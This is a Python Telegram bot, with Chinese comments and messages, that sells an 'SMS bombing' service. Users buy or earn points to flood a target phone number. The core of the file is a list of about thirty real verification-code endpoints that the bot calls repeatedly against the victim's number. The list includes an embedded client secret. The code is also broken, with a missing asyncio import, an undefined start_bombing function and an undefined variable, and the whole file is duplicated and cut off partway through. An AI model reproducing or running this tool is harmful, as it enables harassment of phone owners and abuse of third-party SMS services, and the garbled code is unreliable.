import logging
import requests
import random
import time
from uuid import uuid4
from telegram import Update
from telegram.ext import ContextTypes
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
import os
from flask import Flask
from threading import Thread

# Flask 保持服务
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is live! @PUBGTIANSHENKAR"

# 启动 Flask 服务在指定端口
def run():
    port = 5000  # 使用固定端口8080，或者根据需要更改端口
    app.run(host='0.0.0.0', port=port)

# 启动 Flask 线程保持运行
def keep_alive():
    t = Thread(target=run)
    t.start()

# 设置日志记录
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# 管理员 ID
ADMIN_ID = 1832036764
# 用户积分和签到记录
user_points = {}
user_checkin_times = {}
# 已注册和推荐关系记录
user_registered = set()
user_referred_by = {}
# 红包字典，用于存储红包信息
hongbao_data = {}


# 检查用户是否加入了所有频道
async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    official_channel = '@PUBGTIANSHENKAR'
    backup_channel = '@PUBGTIANSHEN666'

    try:
        # 获取用户在两个频道的成员状态
        official_status = await context.bot.get_chat_member(official_channel, user_id)
        backup_status = await context.bot.get_chat_member(backup_channel, user_id)

        # 检查用户是否在两个频道都是成员
        if (official_status.status in ['member', 'administrator', 'creator'] and 
            backup_status.status in ['member', 'administrator', 'creator']):
            return True
    except Exception:
        pass
    return False

# 检查频道加入并封装装饰器
def channel_required(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if await is_user_member(update, context):
            return await func(update, context, *args, **kwargs)
        else:
            # 用户未加入所有必需的频道，发送提示消息和加入链接
            keyboard = [
                [InlineKeyboardButton("📢 官方主群", url="https://t.me/pubgtianshenkar"),
                 InlineKeyboardButton("📢 交流群组", url="https://t.me/pubgtianshen666")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "⚠️ 请先加入两个指定频道才能使用全部功能。\n\n加入后请重新发送/start。",
                reply_markup=reply_markup
            )
    return wrapper

# /start 命令处理器
@channel_required
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    points = user_points.get(user_id, 0)
    await update.message.reply_text(
        f"👋 欢迎使用天神短信轰炸机器人！\n\n"
        f"ʚ🧸ྀིɞ 师父频道：[](https://t.me/BMGCHEAT)\n\n"
        f"👤 用户ID：`{user_id}`\n"
        f"💰 当前积分：{points}\n\n"
        f"🔧 使用指令 `/dxhz 手机号` 开始轰炸\n"
        f"🛠️ 使用指令 `/qd` 进行每日签到",
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )

# /price 指令处理器
@channel_required
async def price_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "💎 *轰炸积分购买* 💥\n\n"
        "💰 200积分 \\- 50¥\n"
        "💰 500积分 \\- 100¥\n"
        "💰 无限积分 \\- 200¥\n\n"
        "支持支付宝/USDT支付\n\n"
        "积分购买联系 @tianshen\\520",
        parse_mode="MarkdownV2"
    )

# /help 指令处理器
@channel_required
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(
        "👋 欢迎使用天神短信轰炸！\n\n"
        "🎁 每日签到可以随机领 1 至 5 积分\n"
        "💎 1个积分 = 轰炸 1 分钟\n\n"
        "📨 邀请好友获得积分：\n"
        f"邀请链接：https://t.me/TSDXboombot?start=a_{user_id}\n"
        "每邀请一个新用户注册成功可获得 10 积分！\n\n"
        "📋 可用指令：\n"
        "/qd - 签到领取积分\n"
        "/invite - 查看邀请链接"
    )

# /invite 指令处理器 - 生成用户的专属邀请链接
@channel_required
async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    # 使用 bot 用户名生成邀请链接
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=a_{user_id}"
    await update.message.reply_text(
        f"📨 邀请好友链接：\n{invite_link}\n\n"
        "每成功邀请一个新用户注册可获得 10 积分！"
    )

# 处理新用户点击邀请链接注册的逻辑
async def handle_new_user_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    user_id = update.effective_user.id

    # 提取推荐人 ID
    if message_text.startswith("/start a_"):
        referrer_id = int(message_text.split("_")[1])
    else:
        referrer_id = None

    # 检查用户是否已注册
    if user_id in user_registered:
        await update.message.reply_text("⛔ 您已注册，无法通过邀请链接再次注册。")
        return

    # 确保推荐人有效并避免重复邀请
    if referrer_id and referrer_id != user_id and user_referred_by.get(user_id) is None:
        # 初始化新用户积分并标记已注册
        user_points[user_id] = user_points.get(user_id, 0) + 5
        user_registered.add(user_id)
        user_referred_by[user_id] = referrer_id  # 记录推荐人

        # 给推荐人增加积分并发送通知
        user_points[referrer_id] = user_points.get(referrer_id, 0) + 10
        await update.message.reply_text("🎉 注册成功！感谢您的支持，您已获得 5 积分！")
        await context.bot.send_message(
            referrer_id,
            f"🎉 用户 ID {user_id} 使用了您的邀请链接，您获得了 10 积分！当前积分：{user_points[referrer_id]}"
        )
    elif referrer_id:
        await update.message.reply_text("⛔ 您已被其他人邀请注册，当前邀请无效。")
    else:
        # 没有推荐人时，直接注册用户
        user_registered.add(user_id)
        await update.message.reply_text("🎉 欢迎使用天神短信轰炸机器人！")
        
# /addtoken 管理员添加积分
@channel_required
async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 只有管理员可以使用此指令！")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("用法：/addtoken <用户ID> <积分>")
        return

    try:
        target_user_id = int(context.args[0])
        points_to_add = int(context.args[1])
    except ValueError:
        await update.message.reply_text("请确保用户 ID 和积分都是数字。")
        return
    
    user_points[target_user_id] = user_points.get(target_user_id, 0) + points_to_add
    await update.message.reply_text(f"✅ 成功为用户 {target_user_id} 添加了 {points_to_add} 积分！")

# 创建红包功能的命令处理函数
async def hb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 检查是否是授权用户 ID
    if update.effective_user.id not in [7093255498, 1832036764]:
        await update.message.reply_text("❌ 抱歉，只有管理员可以发送积分红包。")
        return

    # 解析命令参数
    try:
        num_people = int(context.args[0])  # 红包可以领取的人数
        total_points = int(context.args[1])  # 每人可领取的积分
    except (IndexError, ValueError):
        await update.message.reply_text("❗ 使用格式: /hb [领取人数] [每人积分]")
        return

    # 生成唯一红包 ID 和链接
    hongbao_id = str(uuid4())
    hongbao_link = f"https://t.me/TSDXboombot?start=hb_{hongbao_id}"

    # 保存红包信息
    hongbao_data[hongbao_id] = {
        "total_points": total_points,
        "remaining_points": total_points,
        "num_people": num_people,
        "claimed_by": set()
    }

    # 发送红包信息到群组
    await update.message.reply_text(
        f"💥 天神短信轰炸机器人💥\n\n"
        f"🎉 发送了一个积分红包！\n"
        f"总数：{num_people} 份\n"
        f"积分：{total_points} 积分\n\n"
        f"[点击此处领取红包]({hongbao_link})\n"
        "数量有限，先到先得！",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# 红包领取处理
@channel_required
async def claim_hongbao(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    user_id = update.effective_user.id

    # 检查是否为有效的红包链接
    if message_text.startswith("/start hb_"):
        hongbao_id = message_text.split("_")[1]
    else:
        await update.message.reply_text("⛔ 无效的红包链接。")
        return

    # 检查红包是否存在并有剩余积分
    if hongbao_id not in hongbao_data:
        await update.message.reply_text("⛔ 红包已被领取完或无效。")
        return

    hongbao = hongbao_data[hongbao_id]

    # 检查是否已经领取过
    if user_id in hongbao["claimed_by"]:
        await update.message.reply_text("⛔ 您已领取过该红包。")
        return

    # 检查是否还有剩余份数
    if len(hongbao["claimed_by"]) >= hongbao["num_people"]:
        await update.message.reply_text("⛔ 红包已被领取完。")
        return

    # 计算每人领取的积分
    points_per_person = hongbao["remaining_points"] // (hongbao["num_people"] - len(hongbao["claimed_by"]))
    if points_per_person <= 0:
        await update.message.reply_text("⛔ 红包积分已分配完毕。")
        return

    # 更新红包信息和用户积分
    hongbao["remaining_points"] -= points_per_person
    hongbao["claimed_by"].add(user_id)
    user_points[user_id] = user_points.get(user_id, 0) + points_per_person

    # 检查红包是否已领取完，若领取完则删除记录
    if len(hongbao["claimed_by"]) >= hongbao["num_people"] or hongbao["remaining_points"] <= 0:
        del hongbao_data[hongbao_id]

    # 通知用户领取成功
    await update.message.reply_text(
        f"🎉 恭喜！您领取了 {points_per_person} 积分！\n"
        f"当前积分：{user_points[user_id]}"
    )

# /qd 签到命令处理器
@channel_required
async def qd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    current_time = datetime.now()
    if user_id in user_checkin_times and current_time.date() == user_checkin_times[user_id].date():
        await update.message.reply_text("📅 今天已经签到过了，明天再来吧！")
    else:
        points = random.randint(1, 5)
        user_points[user_id] = user_points.get(user_id, 0) + points
        user_checkin_times[user_id] = current_time
        await update.message.reply_text(f"🎉 签到成功！获得 {points} 积分，当前积分：{user_points[user_id]}")

# 在 /dxhz 指令中启动异步任务
@channel_required
async def dxhz(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❗️请输入要轰炸的手机号和时间（分钟），例如：/dxhz 12345678901 5")
        return

    user_id = update.effective_user.id
    target_phone = args[0]
    minutes = int(args[1])

    required_points = minutes  # 每分钟消耗 1 积分
    user_points_balance = user_points.get(user_id, 0)
    if user_points_balance < required_points:
        await update.message.reply_text(f"⚠️ 积分不足！您当前有 {user_points_balance} 积分，需要 {required_points} 积分。")
        return

    # 扣除积分
    user_points[user_id] -= required_points
    await update.message.reply_text(f"📞 已开始对 {target_phone} 的轰炸，持续 {minutes} 分钟...")

    # 启动异步轰炸任务
    asyncio.create_task(start_bombing(user_id, target_phone, minutes, context))

# 轰炸持续时间输入
@channel_required
async def collect_time_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    try:
        minutes = int(update.message.text)
        if minutes < 5:
            await update.message.reply_text("⚠️ 请输入有效的时间（至少 5 分钟）")
            return
        
        required_points = minutes  # 每分钟消耗 1 积分
        user_points_balance = user_points.get(user_id, 0)  # 从存储的积分中获取用户当前积分
        if user_points_balance < required_points:
            await update.message.reply_text(f"⚠️ 积分不足！您当前有 {user_points_balance} 积分，需要 {required_points} 积分。")
            return
        
        # 扣除积分
        user_points[user_id] -= required_points
        target_phone = context.user_data.get('target_phone')
        if not target_phone:
            await update.message.reply_text("⚠️ 未指定手机号，请重新使用 /dxhz 指令")
            return
        
        end_time = datetime.now() + timedelta(minutes=minutes)
        await update.message.reply_text(f"📞 开始对 {target_phone} 进行轰炸，持续 {minutes} 分钟...")

        # 短信轰炸API列表
        urls = [
            f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={target_phone}",
            f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={target_phone}",
            f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={target_phone}",
            f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={target_phone}&type=register",
            f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{target_phone}",
            f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={target_phone}",
            f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={target_phone}",
            f"https://api.huandian.cloud/sms?phone={target_phone}&serverKey=qishou",
            f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={target_phone}",
            f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={target_phone}&token=&v=4.1.2023080601",
            f"https://bike.ledear.cn/api/user/code?phone={target_phone}&brandAreaId=1279",
            f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{target_phone}",
            f"https://api.dycxqc.com/user/logon/verifyCode/{target_phone}",
            f"https://api.workdodo.com/czj/sys/open/sms/sendSms?sign=1727138418931&mobile={target_phone}&sendType=1",
            f"https://isus.vip/cgi.sms.send?mobile={target_phone}",
            f"https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={target_phone}&isRegister=true",
            f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={target_phone}&type=1",
            f"https://bsx.baoding12345.cn/web/bduser/register?mobile={target_phone}",
            f"https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={target_phone}&Captcha=&_=1627172292814",
            f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={target_phone}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347",
            f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={target_phone}&sign_type=1&use_type=1",
            f"https://maicai.api.ddxq.mobi/user/getSms?uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.27.1&app_version=4.27.1&channel=applet&app_client_id=4&s_id=05hv9hv42g516917y9339ygy8033yyuyofpi536h55v7y2lezfz883wuj54g5829&openid=osP8I0Wmck0hGvKW9vwKHweXabkM&device_id=osP8I0Wmck0hGvKW9vwKHweXabkM&h5_source=&time=1727040562&device_token=WHJMrwNw1k%2FdxhzDgtawYdgIsh8E%2Fwdbj66furLzNpFRvp5A2rzSGbKhTz9JeO6ELOoGTzJZ436JhQ9V96N7H4JAuMcB7Y6GWPadCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile={target_phone}&verify_code=&type=3&area_code=86&showData=true&app_client_name=wechat&nars=c51c84e76a3425e745d7e58dcfa5ba39&sesi=%7B%22sesiT%22%3A%22AEWLMUUa99456528bc9105603557ab27af4a0fe%22%2C%22sdkV%22%3A%222.0.0%22%7D",
            f"https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={target_phone}&user_type=2",
            f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={target_phone}",
            f"https://apis.niuxuezhang.cn/v1/sms-code?phone={target_phone}",
            f"https://wccy-server.sxlyb.com/open/v1/login-code/{target_phone}?phone={target_phone}",
            f"https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={target_phone}&v=9.0&os=Windows",
            f"https://www.huameitang.com/api.php?do=getMobileCode&mobile={target_phone}",
            f"https://api.hichefu.com/client-openapi/driver/user/getVerifyCode?phone={target_phone}",
            f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={target_phone}",
            f"http://n103.top:84/smsboom/?hm={idcard}",

            
        ]

        while datetime.now() < end_time:
            for url in urls:
                try:
                    response = requests.get(url)
                except Exception as e:
                    pass  # 忽略错误，不输出任何信息
            time.sleep(5)  # 调整时间间隔
        
        await update.message.reply_text(f"✅ 轰炸已完成，对 {target_phone} 持续了 {minutes} 分钟。当前剩余积分：{user_points[user_id]}")

    except ValueError:
        await update.message.reply_text("⚠️ 请输入有效的时间（至少 5 分钟）")

if __name__ == '__main__':
    keep_alive()
import logging
import requests
import random
import time
from uuid import uuid4
from telegram import Update
from telegram.ext import ContextTypes
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
import os
from flask import Flask
from threading import Thread

# Flask 保持服务
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is live! @PUBGTIANSHENKAR"

# 启动 Flask 服务在指定端口
def run():
    port = 5000  # 使用固定端口8080，或者根据需要更改端口
    app.run(host='0.0.0.0', port=port)

# 启动 Flask 线程保持运行
def keep_alive():
    t = Thread(target=run)
    t.start()

# 设置日志记录
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# 管理员 ID
ADMIN_ID = 1832036764
# 用户积分和签到记录
user_points = {}
user_checkin_times = {}
# 已注册和推荐关系记录
user_registered = set()
user_referred_by = {}
# 红包字典，用于存储红包信息
hongbao_data = {}


# 检查用户是否加入了所有频道
async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    official_channel = '@PUBGTIANSHENKAR'
    backup_channel = '@PUBGTIANSHEN666'

    try:
        # 获取用户在两个频道的成员状态
        official_status = await context.bot.get_chat_member(official_channel, user_id)
        backup_status = await context.bot.get_chat_member(backup_channel, user_id)

        # 检查用户是否在两个频道都是成员
        if (official_status.status in ['member', 'administrator', 'creator'] and 
            backup_status.status in ['member', 'administrator', 'creator']):
            return True
    except Exception:
        pass
    return False

# 检查频道加入并封装装饰器
def channel_required(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if await is_user_member(update, context):
            return await func(update, context, *args, **kwargs)
        else:
            # 用户未加入所有必需的频道，发送提示消息和加入链接
            keyboard = [
                [InlineKeyboardButton("📢 官方主群", url="https://t.me/pubgtianshenkar"),
                 InlineKeyboardButton("📢 交流群组", url="https://t.me/pubgtianshen666")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "⚠️ 请先加入两个指定频道才能使用全部功能。\n\n加入后请重新发送/start。",
                reply_markup=reply_markup
            )
    return wrapper

# /start 命令处理器
@channel_required
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    points = user_points.get(user_id, 0)
    await update.message.reply_text(
        f"👋 欢迎使用天神短信轰炸机器人！\n\n"
        f"ʚ🧸ྀིɞ 师父频道：[](https://t.me/BMGCHEAT)\n\n"
        f"👤 用户ID：`{user_id}`\n"
        f"💰 当前积分：{points}\n\n"
        f"🔧 使用指令 `/dxhz 手机号` 开始轰炸\n"
        f"🛠️ 使用指令 `/qd` 进行每日签到",
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )

# /price 指令处理器
@channel_required
async def price_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "💎 *轰炸积分购买* 💥\n\n"
        "💰 200积分 \\- 50¥\n"
        "💰 500积分 \\- 100¥\n"
        "💰 无限积分 \\- 200¥\n\n"
        "支持支付宝/USDT支付\n\n"
        "积分购买联系 @tianshen\\520",
        parse_mode="MarkdownV2"
    )

# /help 指令处理器
@channel_required
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(
        "👋 欢迎使用天神短信轰炸！\n\n"
        "🎁 每日签到可以随机领 1 至 5 积分\n"
        "💎 1个积分 = 轰炸 1 分钟\n\n"
        "📨 邀请好友获得积分：\n"
        f"邀请链接：https://t.me/TSDXboombot?start=a_{user_id}\n"
        "每邀请一个新用户注册成功可获得 10 积分！\n\n"
        "📋 可用指令：\n"
        "/qd - 签到领取积分\n"
        "/invite - 查看邀请链接"
    )

# /invite 指令处理器 - 生成用户的专属邀请链接
@channel_required
async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    # 使用 bot 用户名生成邀请链接
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=a_{user_id}"
    await update.message.reply_text(
        f"📨 邀请好友链接：\n{invite_link}\n\n"
        "每成功邀请一个新用户注册可获得 10 积分！"
    )

# 处理新用户点击邀请链接注册的逻辑
async def handle_new_user_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    user_id = update.effective_user.id

    # 提取推荐人 ID
    if message_text.startswith("/start a_"):
        referrer_id = int(message_text.split("_")[1])
    else:
        referrer_id = None

    # 检查用户是否已注册
    if user_id in user_registered:
        await update.message.reply_text("⛔ 您已注册，无法通过邀请链接再次注册。")
        return

    # 确保推荐人有效并避免重复邀请
    if referrer_id and referrer_id != user_id and user_referred_by.get(user_id) is None:
        # 初始化新用户积分并标记已注册
        user_points[user_id] = user_points.get(user_id, 0) + 5
        user_registered.add(user_id)
        user_referred_by[user_id] = referrer_id  # 记录推荐人

        # 给推荐人增加积分并发送通知
        user_points[referrer_id] = user_points.get(referrer_id, 0) + 10
        await update.message.reply_text("🎉 注册成功！感谢您的支持，您已获得 5 积分！")
        await context.bot.send_message(
            referrer_id,
            f"🎉 用户 ID {user_id} 使用了您的邀请链接，您获得了 10 积分！当前积分：{user_points[referrer_id]}"
        )
    elif referrer_id:
        await update.message.reply_text("⛔ 您已被其他人邀请注册，当前邀请无效。")
    else:
        # 没有推荐人时，直接注册用户
        user_registered.add(user_id)
        await update.message.reply_text("🎉 欢迎使用天神短信轰炸机器人！")
        
# /addtoken 管理员添加积分
@channel_required
async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 只有管理员可以使用此指令！")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("用法：/addtoken <用户ID> <积分>")
        return

    try:
        target_user_id = int(context.args[0])
        points_to_add = int(context.args[1])
    except ValueError:
        await update.message.reply_text("请确保用户 ID 和积分都是数字。")
        return
    
    user_points[target_user_id] = user_points.get(target_user_id, 0) + points_to_add
    await update.message.reply_text(f"✅ 成功为用户 {target_user_id} 添加了 {points_to_add} 积分！")

# 创建红包功能的命令处理函数
async def hb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 检查是否是授权用户 ID
    if update.effective_user.id not in [7093255498, 1832036764]:
        await update.message.reply_text("❌ 抱歉，只有管理员可以发送积分红包。")
        return

    # 解析命令参数
    try:
        num_people = int(context.args[0])  # 红包可以领取的人数
        total_points = int(context.args[1])  # 每人可领取的积分
    except (IndexError, ValueError):
        await update.message.reply_text("❗ 使用格式: /hb [领取人数] [每人积分]")
        return

    # 生成唯一红包 ID 和链接
    hongbao_id = str(uuid4())
    hongbao_link = f"https://t.me/TSDXboombot?start=hb_{hongbao_id}"

    # 保存红包信息
    hongbao_data[hongbao_id] = {
        "total_points": total_points,
        "remaining_points": total_points,
        "num_people": num_people,
        "claimed_by": set()
    }

    # 发送红包信息到群组
    await update.message.reply_text(
        f"💥 天神短信轰炸机器人💥\n\n"
        f"🎉 发送了一个积分红包！\n"
        f"总数：{num_people} 份\n"
        f"积分：{total_points} 积分\n\n"
        f"[点击此处领取红包]({hongbao_link})\n"
        "数量有限，先到先得！",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# 红包领取处理
@channel_required
async def claim_hongbao(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message_text = update.message.text
    user_id = update.effective_user.id

    # 检查是否为有效的红包链接
    if message_text.startswith("/start hb_"):
        hongbao_id = message_text.split("_")[1]
    else:
        await update.message.reply_text("⛔ 无效的红包链接。")
        return

    # 检查红包是否存在并有剩余积分
    if hongbao_id not in hongbao_data:
        await update.message.reply_text("⛔ 红包已被领取完或无效。")
        return

    hongbao = hongbao_data[hongbao_id]

    # 检查是否已经领取过
    if user_id in hongbao["claimed_by"]:
        await update.message.reply_text("⛔ 您已领取过该红包。")
        return

    # 检查是否还有剩余份数
    if len(hongbao["claimed_by"]) >= hongbao["num_people"]:
        await update.message.reply_text("⛔ 红包已被领取完。")
        return

    # 计算每人领取的积分
    points_per_person = hongbao["remaining_points"] // (hongbao["num_people"] - len(hongbao["claimed_by"]))
    if points_per_person <= 0:
        await update.message.reply_text("⛔ 红包积分已分配完毕。")
        return

    # 更新红包信息和用户积分
    hongbao["remaining_points"] -= points_per_person
    hongbao["claimed_by"].add(user_id)
    user_points[user_id] = user_points.get(user_id, 0) + points_per_person

    # 检查红包是否已领取完，若领取完则删除记录
    if len(hongbao["claimed_by"]) >= hongbao["num_people"] or hongbao["remaining_points"] <= 0:
        del hongbao_data[hongbao_id]

    # 通知用户领取成功
    await update.message.reply_text(
        f"🎉 恭喜！您领取了 {points_per_person} 积分！\n"
        f"当前积分：{user_points[user_id]}"
    )

# /qd 签到命令处理器
@channel_required
async def qd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    current_time = datetime.now()
    if user_id in user_checkin_times and current_time.date() == user_checkin_times[user_id].date():
        await update.message.reply_text("📅 今天已经签到过了，明天再来吧！")
    else:
        points = random.randint(1, 5)
        user_points[user_id] = user_points.get(user_id, 0) + points
        user_checkin_times[user_id] = current_time
        await update.message.reply_text(f"🎉 签到成功！获得 {points} 积分，当前积分：{user_points[user_id]}")

# 在 /dxhz 指令中启动异步任务
@channel_required
async def dxhz(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❗️请输入要轰炸的手机号和时间（分钟），例如：/dxhz 12345678901 5")
        return

    user_id = update.effective_user.id
    target_phone = args[0]
    minutes = int(args[1])

    required_points = minutes  # 每分钟消耗 1 积分
    user_points_balance = user_points.get(user_id, 0)
    if user_points_balance < required_points:
        await update.message.reply_text(f"⚠️ 积分不足！您当前有 {user_points_balance} 积分，需要 {required_points} 积分。")
        return

    # 扣除积分
    user_points[user_id] -= required_points
    await update.message.reply_text(f"📞 已开始对 {target_phone} 的轰炸，持续 {minutes} 分钟...")

    # 启动异步轰炸任务
    asyncio.create_task(start_bombing(user_id, target_phone, minutes, context))

# 轰炸持续时间输入
@channel_required
async def collect_time_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    try:
        minutes = int(update.message.text)
        if minutes < 5:
            await update.message.reply_text("⚠️ 请输入有效的时间（至少 5 分钟）")
            return
        
        required_points = minutes  # 每分钟消耗 1 积分
        user_points_balance = user_points.get(user_id, 0)  # 从存储的积分中获取用户当前积分
        if user_points_balance < required_points:
            await update.message.reply_text(f"⚠️ 积分不足！您当前有 {user_points_balance} 积分，需要 {required_points} 积分。")
            return
        
        # 扣除积分
        user_points[user_id] -= required_points
        target_phone = context.user_data.get('target_phone')
        if not target_phone:
            await update.message.reply_text("⚠️ 未指定手机号，请重新使用 /dxhz 指令")
            return
        
        end_time = datetime.now() + timedelta(minutes=minutes)
        await update.message.reply_text(f"📞 开始对 {target_phone} 进行轰炸，持续 {minutes} 分钟...")

        # 短信轰炸API列表
        urls = [
            f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={target_phone}",
            f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={target_phone}",
            f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={target_phone}",
            f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={target_phone}&type=register",
            f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{target_phone}",
            f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={target_phone}",
            f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={target_phone}",
            f"https://api.huandian.cloud/sms?phone={target_phone}&serverKey=qishou",
            f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={target_phone}",
            f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={target_phone}&token=&v=4.1.2023080601",
            f"https://bike.ledear.cn/api/user/code?phone={target_phone}&brandAreaId=1279",
            f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{target_phone}",
            f"https://api.dycxqc.com/user/logon/verifyCode/{target_phone}",
            f"https://api.workdodo.com/czj/sys/open/sms/sendSms?sign=1727138418931&mobile={target_phone}&sendType=1",
            f"https://isus.vip/cgi.sms.send?mobile={target_phone}",
            f"https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={target_phone}&isRegister=true",
            f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={target_phone}&type=1",
            f"https://bsx.baoding12345.cn/web/bduser/register?mobile={target_phone}",
            f"https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={target_phone}&Captcha=&_=1627172292814",
            f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={target_phone}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347",
            f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={target_phone}&sign_type=1&use_type=1",
            f"https://maicai.api.ddxq.mobi/user/getSms?uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.27.1&app_version=4.27.1&channel=applet&app_client_id=4&s_id=05hv9hv42g516917y9339ygy8033yyuyofpi536h55v7y2lezfz883wuj54g5829&openid=osP8I0Wmck0hGvKW9vwKHweXabkM&device_id=osP8I0Wmck0hGvKW9vwKHweXabkM&h5_source=&time=1727040562&device_token=WHJMrwNw1k%2FdxhzDgtawYdgIsh8E%2Fwdbj66furLzNpFRvp5A2rzSGbKhTz9JeO6ELOoGTzJZ436JhQ9V96N7H4JAuMcB7Y6GWPadCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile={target_phone}&verify_code=&type=3&area_code=86&showData=true&app_client_name=wechat&nars=c51c84e76a3425e745d7e58dcfa5ba39&sesi=%7B%22sesiT%22%3A%22AEWLMUUa99456528bc9105603557ab27af4a0fe%22%2C%22sdkV%22%3A%222.0.0%22%7D",
